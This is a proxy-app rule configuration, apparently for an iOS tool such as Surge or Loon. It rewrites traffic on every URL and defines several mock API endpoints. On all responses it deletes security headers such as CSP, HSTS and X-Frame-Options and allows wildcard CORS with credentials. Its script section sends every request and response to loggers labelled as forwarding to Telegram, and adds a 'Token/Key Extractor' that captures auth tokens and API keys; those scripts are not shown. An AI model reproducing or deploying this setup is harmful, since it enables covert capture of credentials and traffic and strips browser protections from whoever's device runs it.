# ══════════════════════════════════
# HEADER REWRITE
# ══════════════════════════════════
[Header Rewrite]
# Request Headers
^https?:// header-replace request User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
^https?:// header-replace request Accept "*/*"
^https?:// header-replace request Accept-Language "en-US,en;q=0.9"
^https?:// header-replace request Accept-Encoding "gzip, deflate, br"
^https?:// header-replace request Cache-Control "no-cache"
^https?:// header-replace request Pragma "no-cache"
^https?:// header-del request Referer
^https?:// header-del request X-Forwarded-For
^https?:// header-del request X-Real-IP
^https?:// header-del request CF-Connecting-IP
^https?:// header-del request True-Client-IP

# Response Headers
^https?:// header-replace response Access-Control-Allow-Origin "*"
^https?:// header-add response Access-Control-Allow-Methods "GET, POST, PUT, DELETE, OPTIONS, PATCH"
^https?:// header-add response Access-Control-Allow-Headers "*"
^https?:// header-add response Access-Control-Allow-Credentials "true"
^https?:// header-del response Content-Security-Policy
^https?:// header-del response Content-Security-Policy-Report-Only
^https?:// header-del response X-Frame-Options
^https?:// header-del response X-Content-Type-Options
^https?:// header-del response Strict-Transport-Security
^https?:// header-del response X-XSS-Protection
^https?:// header-del response Referrer-Policy
^https?:// header-del response Permissions-Policy
^https?:// header-del response Feature-Policy
^https?:// header-del response Expect-CT
^https?:// header-del response Public-Key-Pins
^https?:// header-del response X-Download-Options
^https?:// header-del response X-Permitted-Cross-Domain-Policies

# ══════════════════════════════════
# URL REWRITE
# ══════════════════════════════════
[URL Rewrite]
# HTTP to HTTPS
^http://(.*) https://$1 302

# Remove tracking params
^https?://(.*)(\?|&)(utm_source|utm_medium|utm_campaign|utm_term|utm_content|fbclid|gclid|ref|source)=[^&]*(.*) https://$1$2$4 302

# Mock API endpoints
^https?://mock\.axe\.local/success - mock-response-body={"status":"success","code":200,"data":{}}, mock-response-status=200, mock-response-headers=Content-Type:application/json
^https?://mock\.axe\.local/error - mock-response-body={"status":"error","code":500,"message":"Internal Server Error"}, mock-response-status=500, mock-response-headers=Content-Type:application/json
^https?://mock\.axe\.local/auth - mock-response-body={"token":"mock_token_axe_123","expires_in":3600,"user_id":"axe_001"}, mock-response-status=200, mock-response-headers=Content-Type:application/json
^https?://mock\.axe\.local/empty - mock-response-body={}, mock-response-status=200, mock-response-headers=Content-Type:application/json

# ══════════════════════════════════
# MAP LOCAL
# ══════════════════════════════════
[Map Local]
^https?://mock\.axe\.local/ping - data={"pong":true}

# ══════════════════════════════════
# MOCK
# ══════════════════════════════════
[Mock]
^https?://mock\.axe\.local/success data={"status":"success","code":200,"data":{}} status-code=200 data-type=text
^https?://mock\.axe\.local/error data={"status":"error","code":500} status-code=500 data-type=text
^https?://mock\.axe\.local/auth data={"token":"mock_token_axe_123","expires_in":3600} status-code=200 data-type=text
^https?://mock\.axe\.local/empty data={} status-code=200 data-type=text
^https?://mock\.axe\.local/ping data={"pong":true,"ts":0} status-code=200 data-type=text

# ══════════════════════════════════
# SCRIPT
# ══════════════════════════════════
[Script]
# Master Request Logger → Telegram
http-request ^https?:// script-path=request_logger.js, requires-body=true, timeout=15, tag=ReqLogger

# Master Response Logger → Telegram
http-response ^https?:// script-path=response_logger.js, requires-body=true, timeout=15, tag=ResLogger

# Token/Key Extractor - Captures auth tokens, API keys
http-response ^https?:// script-path=token_extractor.js, requires-body=true, timeout=10, tag=TokenExtract

# Body Modifier - Inject custom fields in requests
http-request ^https?://api\. script-path=body_modifier.js, requires-body=true, timeout=10, tag=BodyMod

# DNS over HTTPS logger
dns-query script-path=dns_logger.js, timeout=10, tag=DNSLog

